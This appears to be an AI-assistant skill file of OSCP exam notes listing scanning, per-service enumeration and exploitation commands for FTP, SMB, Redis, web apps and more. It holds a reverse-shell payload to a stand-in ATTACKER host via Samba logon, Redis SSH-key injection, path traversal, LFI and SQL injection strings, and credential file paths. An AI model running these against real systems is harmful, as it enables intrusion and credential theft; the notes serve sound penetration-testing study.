---
name: OSCP Notes
description: |
  The assistant provides detailed OSCP preparation notes covering service enumeration, exploitation techniques, and protocol-specific attacks. Activate when users ask about "OSCP enumeration," "service pentesting," "SMB attacks," "FTP exploitation," "SSH pentesting," or "protocol-specific exploits."
version: "1.0.0"
tags:
  - oscp
  - enumeration
  - exploitation
  - protocols
  - penetration-testing
---

# OSCP Notes

## Purpose

Provide detailed service enumeration and exploitation techniques for OSCP exam preparation. Cover protocol-specific attacks, common vulnerabilities, and proven exploitation methods for each major service.

## Inputs/Prerequisites

- Kali Linux or penetration testing distribution
- Target IP addresses and network access
- Nmap, Metasploit, and standard pentest tools
- Understanding of network protocols

## Outputs/Deliverables

- Service enumeration results
- Identified vulnerabilities
- Working exploits and shell access
- Captured credentials
- Documented attack methodology

## Core Workflow

### 1. Port Scanning

```bash
# Comprehensive Nmap scan
nmap -sC -sV -o nmap -A -T5 10.10.10.x

# Host discovery
nmap -sn 10.10.1.1-254 -vv -oA hosts
netdiscover -r 10.10.10.0/24

# DNS server discovery
nmap -p 53 10.10.10.1-254 -vv -oA dcs

# NSE vulnerability scripts
nmap -sV --script=vulscan/vulscan.nse TARGET

# List available scripts
ls /usr/share/nmap/scripts/ssh*
ls /usr/share/nmap/scripts/smb*

# Full port scan
masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.x -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | uniq | tr '\n' ',')
nmap -Pn -sV -sC -p$ports 10.10.10.x
```

### 2. FTP Enumeration (Port 21)

```bash
# Check anonymous access
ftp TARGET
# Username: anonymous
# Password: anonymous

# Upload files if writable
ftp> put shell.php

# Common FTP exploits:
# - vsftpd 2.3.4 Backdoor
# - ProFTPD 1.3.5 mod_copy

# Nmap scripts
nmap --script ftp-anon TARGET
nmap --script ftp-vsftpd-backdoor TARGET
```

### 3. SSH Enumeration (Port 22)

```bash
# Key-based authentication
# id_rsa.pub: Public key for authorized_keys
# id_rsa: Private key for login

# Login with private key
ssh -i id_rsa user@TARGET

# Crack key passphrase
ssh2john id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt

# Passwordless login setup
# Add id_rsa.pub to target's ~/.ssh/authorized_keys

# Banner grabbing
ssh -v TARGET
nmap -p 22 --script ssh-hostkey TARGET
```

### 4. DNS Enumeration (Port 53)

```bash
# Add host to /etc/hosts first
echo "10.10.10.135 target.htb" >> /etc/hosts

# Zone transfer
dig axfr target.htb @10.10.10.135
dnsrecon -d target.htb -t axfr

# Subdomain brute force
dnsrecon -d target.htb -t brt -D /usr/share/wordlists/subdomains.txt

# Reverse lookup
dnsrecon -r 10.10.10.0/24 -n 10.10.10.135
```

### 5. RPC Enumeration (Port 111/135)

```bash
# RPC Bind (111)
rpcclient --user="" --command=enumprivs -N TARGET
rpcinfo -p TARGET
rpcbind -p TARGET

# MS RPC (135)
rpcdump.py TARGET -p 135
rpcdump.py TARGET -p 135 | grep ncacn_np  # Get pipe names
rpcmap.py ncacn_ip_tcp:TARGET[135]
```

### 6. SMB Enumeration (Port 139/445)

```bash
# Protocol detection
nmap --script smb-protocols TARGET

# List shares
smbclient -L //TARGET
smbclient -L //TARGET -N  # Null session
smbclient --no-pass -L TARGET

# Connect to share
smbclient //TARGET/share_name
smbclient -U "username%password" //TARGET/sharename

# SMB Map enumeration
smbmap -H TARGET
smbmap -H TARGET -u '' -p ''
smbmap -H TARGET -s share_name

# CrackMapExec
crackmapexec smb TARGET -u '' -p '' --shares
crackmapexec smb TARGET -u 'user' -p 'pass' --shares

# Enum4Linux comprehensive
enum4linux -a TARGET

# RPC client enumeration
rpcclient -U "" TARGET
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> queryuser [rid]
rpcclient> getdompwinfo

# Brute force
ncrack -u username -P rockyou.txt -T 5 TARGET -p smb -v

# Mount share
mount -t cifs "//TARGET/share/" /mnt/smb
mount -t cifs "//TARGET/share/" /mnt/smb -o vers=1.0,user=root,uid=0,gid=0

# SMB to reverse shell
smbclient -U "username%password" //TARGET/sharename
smb> logon "/=nc ATTACKER 4444 -e /bin/bash"
```

**SMB Exploits:**

| Vulnerability | Versions | Exploit |
|--------------|----------|---------|
| Samba usermap script (CVE-2007-2447) | 3.0.20-3.0.25rc3 | RCE via username |
| EternalBlue (CVE-2017-0144) | Windows Vista-10, Server 2008-2016 | MS17-010 |
| SambaCry (CVE-2017-7494) | Samba < 4.5.9 | Writable share RCE |

### 7. SNMP Enumeration (Port 161)

```bash
# Basic enumeration
snmpwalk -c public -v1 TARGET
snmpcheck -t TARGET -c public
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET

# Nmap scan
nmap -sU -p 161 TARGET

# SNMP enum
snmpenum -t TARGET

# MIB values
snmpwalk -c public -v1 TARGET 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -c public -v1 TARGET 1.3.6.1.2.1.25.6.3.1.2  # Installed software
snmpwalk -c public -v1 TARGET 1.3.6.1.4.1.77.1.2.25   # User accounts
```

### 8. IRC Enumeration (Port 194/6667)

```bash
# Nmap scripts
nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 TARGET

# UnrealIRCd 3.2.8.1 Backdoor exploit available
```

### 9. NFS Enumeration (Port 2049)

```bash
# Show exports
showmount -e TARGET

# Mount share
mkdir /mnt/nfs
mount -t nfs TARGET:/share /mnt/nfs

# Permission issues
# If permission denied, may need to create user with matching UID
```

### 10. MySQL Enumeration (Port 3306)

```bash
# Nmap scripts
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 TARGET

# Connect to database
mysql -h TARGET -u root -p

# Basic queries
SHOW databases;
USE database;
SHOW tables;
SELECT * FROM users;
```

### 11. Redis Enumeration (Port 6379)

```bash
# Connect to Redis
redis-cli -h TARGET

# Get configuration
CONFIG GET *

# SSH key injection (if writable)
# Write to /var/lib/redis/.ssh/ or /home/redis/.ssh/

# Generate SSH key
ssh-keygen -t rsa -f redis_key

# Upload key
redis-cli -h TARGET
CONFIG SET dir /var/lib/redis/.ssh/
CONFIG SET dbfilename "authorized_keys"
SET ssh_key "\n\nssh-rsa AAAA...\n\n"
SAVE
```

### 12. Web Application Attacks

**Directory Traversal:**

```bash
# Linux
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd

# Windows
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows\system32\config\sam
```

**Local File Inclusion:**

```bash
# Read files
page=../../../etc/passwd

# PHP filter (read source)
page=php://filter/convert.base64-encode/resource=index.php

# Log poisoning
# Inject PHP into User-Agent, then include access log
page=/var/log/apache2/access.log
```

**SQL Injection:**

```bash
# Basic tests
' OR 1=1--
" OR 1=1--
' UNION SELECT NULL--

# SQLMap
sqlmap -u "http://TARGET/page.php?id=1" --dbs
sqlmap -u "http://TARGET/page.php?id=1" -D database -T users --dump
sqlmap -u "http://TARGET/page.php?id=1" --os-shell
```

## Quick Reference

### Important File Locations

**Linux:**
```
/etc/passwd
/etc/shadow
/etc/hosts
/home/user/.ssh/id_rsa
/var/log/auth.log
```

**Windows:**
```
C:\Windows\System32\config\SAM
C:\Windows\System32\drivers\etc\hosts
C:\Users\Administrator\NTUser.dat
C:\inetpub\wwwroot\web.config
```

### Common Ports Quick Reference

| Port | Service | First Actions |
|------|---------|---------------|
| 21 | FTP | Check anonymous, upload |
| 22 | SSH | Key auth, brute force |
| 25 | SMTP | User enum, relay |
| 53 | DNS | Zone transfer |
| 80/443 | HTTP/S | Dir enum, vulns |
| 139/445 | SMB | Share enum, exploits |
| 161 | SNMP | Community brute |
| 3306 | MySQL | Default creds |

## Constraints

- Exploits are version-specific
- Some services require credentials
- Firewalls may block enumeration
- Rate limiting may affect scanning

## Examples

### Example 1: Quick SMB Check

```bash
smbclient -L //TARGET -N && enum4linux -a TARGET
```

### Example 2: Full Service Enum

```bash
nmap -sV -sC -p- TARGET -oA full_scan
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Connection refused | Check if service is running |
| Access denied | Try null session or default creds |
| Timeout | Reduce scan speed, check firewall |
| No results | Try different enumeration technique |
